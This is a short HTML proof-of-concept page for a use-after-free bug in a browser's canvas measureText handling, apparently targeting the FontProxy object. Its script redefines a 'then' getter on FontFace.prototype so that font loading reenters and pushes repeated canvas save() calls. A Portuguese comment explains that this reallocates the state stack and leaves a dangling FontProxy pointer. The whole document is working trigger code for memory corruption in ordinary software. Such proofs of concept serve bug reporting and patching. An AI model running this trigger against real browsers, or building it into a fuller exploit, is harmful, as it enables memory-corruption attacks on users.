
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - Canvas measureText FontProxy UAF (fe938b0)</title>
</head>
<body>
<script>
  let face = new FontFace('MyTestFam', 'local(Helvetica)');
  face.loaded;
  document.fonts.add(face);
  
  let canvas = document.createElement('canvas');
  canvas.width = 64;
  canvas.height = 64;
  canvas.style.cssText = 'position:absolute;left:-9999px';
  document.body.appendChild(canvas);
  
  let context = canvas.getContext('2d');
  context.save();
  context.lineWidth = 0.5;
  context.font = '10px MyTestFam';
  
  let reentered = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get() {
      if (reentered)
        return undefined;
      reentered = true;
      // Estoura a pilha de estados durante o carregamento síncrono/reentrante,
      // forçando realocação e invalidando o ponteiro de FontProxy.
      for (let i = 0; i < 18; i++) {
        context.save();
        context.lineWidth = 1 + i;
      }
      reentered = false;
      return undefined;
    }
  });

  context.measureText('a');
</script>
</body>
</html>
